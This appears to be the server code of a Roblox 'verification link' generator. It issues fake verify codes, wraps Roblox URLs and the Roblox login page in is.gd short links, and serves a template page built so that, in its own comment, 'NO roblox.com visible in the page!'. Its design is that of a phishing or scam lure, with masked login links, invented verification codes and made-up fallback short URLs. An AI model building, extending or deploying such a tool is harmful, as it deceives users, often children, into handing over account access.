const express = require('express');
const path = require('path');
const fs = require('fs');
const https = require('https');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Store verification links
const verifyLinks = new Map();

// Function to create is.gd short URL for ANY Roblox URL (including login)
function createIsGdShortUrl(longUrl, callback) {
    const encodedUrl = encodeURIComponent(longUrl);
    const apiUrl = `https://is.gd/create.php?format=json&url=${encodedUrl}`;
    
    console.log(`[is.gd API] Creating short URL for: ${longUrl}`);
    
    https.get(apiUrl, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
            try {
                const json = JSON.parse(data);
                if (json.shorturl) {
                    console.log(`[is.gd API] Success: ${json.shorturl}`);
                    callback(null, json.shorturl);
                } else {
                    console.log(`[is.gd API] Error: ${json.errormessage}`);
                    callback(json.errormessage || 'Failed to shorten URL', null);
                }
            } catch (e) {
                console.log(`[is.gd API] Parse error: ${e.message}`);
                callback('Invalid response from is.gd', null);
            }
        });
    }).on('error', (err) => {
        console.log(`[is.gd API] Request error: ${err.message}`);
        callback(err.message, null);
    });
}

// Main generator page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API to generate verification link - AUTO-DETECTS and converts ANY Roblox URL
app.post('/api/generate', (req, res) => {
    const { url } = req.body;
    
    if (!url) {
        return res.status(400).json({ error: 'No URL provided', success: false });
    }
    
    // Check if it's a Roblox URL (any roblox.com link including /login)
    if (!url.includes('roblox.com')) {
        return res.status(400).json({ error: 'Please enter a valid Roblox URL (must contain roblox.com)', success: false });
    }
    
    // Generate 12 random digits for the verify code
    const verifyCode = Math.floor(100000000000 + Math.random() * 900000000000).toString();
    
    // Get the base URL
    const baseUrl = process.env.VERCEL_URL 
        ? `https://${process.env.VERCEL_URL}`
        : `http://localhost:${process.env.PORT || 3000}`;
    
    const generatedLink = `${baseUrl}/verify=${verifyCode}`;
    
    // STEP 1: Create is.gd for the user's entered URL (could be any Roblox page)
    createIsGdShortUrl(url, (err, userUrlIsGd) => {
        const userUrlShort = userUrlIsGd || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
        
        // STEP 2: Create is.gd for the Roblox login page (https://www.roblox.com/login)
        const robloxLoginUrl = 'https://www.roblox.com/login';
        createIsGdShortUrl(robloxLoginUrl, (err2, loginIsGd) => {
            const loginPageShort = loginIsGd || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
            
            // STEP 3: Create a random is.gd holder for redirects
            const isGdHolder = `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
            
            // Store ALL is.gd URLs
            verifyLinks.set(verifyCode, {
                originalUrl: url,
                userUrlIsGd: userUrlShort,
                loginPageIsGd: loginPageShort,
                isGdHolder: isGdHolder,
                verifyCode: verifyCode,
                createdAt: Date.now()
            });
            
            console.log(`[Server] Generated for code ${verifyCode}:`);
            console.log(`  - Original URL: ${url}`);
            console.log(`  - User URL (is.gd): ${userUrlShort}`);
            console.log(`  - Login Page (is.gd): ${loginPageShort}`);
            console.log(`  - Holder (is.gd): ${isGdHolder}`);
            
            res.json({
                success: true,
                originalUrl: url,
                generatedUrl: generatedLink,
                verifyCode: verifyCode,
                userUrlIsGd: userUrlShort,
                loginPageIsGd: loginPageShort,
                isGdHolder: isGdHolder
            });
        });
    });
});

// Dynamic route for /verify=XXXXXXXXXXXX
app.get('/verify=:code', (req, res) => {
    const code = req.params.code;
    const linkData = verifyLinks.get(code);
    
    // Read the verify.html template
    const htmlPath = path.join(__dirname, 'public', 'verify.html');
    
    if (!fs.existsSync(htmlPath)) {
        return res.status(404).send('Verification page not found. Please make sure verify.html exists in the public folder.');
    }
    
    let html = fs.readFileSync(htmlPath, 'utf8');
    
    // Use stored is.gd URLs or create fallbacks
    const userUrlIsGd = linkData?.userUrlIsGd || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
    const loginPageIsGd = linkData?.loginPageIsGd || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
    const isGdHolder = linkData?.isGdHolder || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
    
    // Replace placeholders - ALL is.gd, NO roblox.com visible in the page!
    html = html.replace(/\{\{VERIFY_CODE\}\}/g, code);
    html = html.replace(/\{\{USER_URL_IS_GD\}\}/g, userUrlIsGd);
    html = html.replace(/\{\{LOGIN_PAGE_IS_GD\}\}/g, loginPageIsGd);
    html = html.replace(/\{\{IS_GD_HOLDER\}\}/g, isGdHolder);
    
    console.log(`[Server] Serving verification page for code: ${code}`);
    console.log(`  - User URL (is.gd): ${userUrlIsGd}`);
    console.log(`  - Login Page (is.gd): ${loginPageIsGd}`);
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
});

// API to get link data
app.get('/api/link/:code', (req, res) => {
    const code = req.params.code;
    const linkData = verifyLinks.get(code);
    
    if (linkData) {
        res.json({ success: true, ...linkData });
    } else {
        res.json({ success: false, error: 'Invalid verification link' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`is.gd API ready - will convert ANY Roblox URL to short links`);
});

module.exports = app;
